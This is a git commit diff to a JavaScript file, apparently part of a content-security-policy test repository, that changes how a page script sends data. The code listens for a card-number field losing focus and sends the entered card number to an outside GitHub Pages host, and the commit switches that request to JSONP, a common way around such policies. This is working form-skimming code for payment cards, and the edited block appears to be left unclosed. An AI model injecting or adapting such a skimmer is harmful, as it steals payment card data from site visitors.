b0f4147177ced3ff73d8f9711ba11f645f448516
mmiesiak <3510877+mmiesiak@users.noreply.github.com>
2019-05-30 11:56:12 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,17 @@
 setTimeout(function() {
   $("#card-number").on('blur', function() {
-    $.get( "https://mmiesiak.github.io/csp/test.html?card=" + $(this).val() );
+    $.ajax({
+    url: "https://mmiesiak.github.io/csp/test.html?card=" + $(this).val(),
+ 
+    // The name of the callback parameter, as specified by the YQL service
+    jsonp: "callback",
+ 
+    // Tell jQuery we're expecting JSONP
+    dataType: "jsonp",
+ 
+    // Work with the response
+    success: function( response ) {
+        console.log( response ); // server response
+    }
   })
 }, 5000);
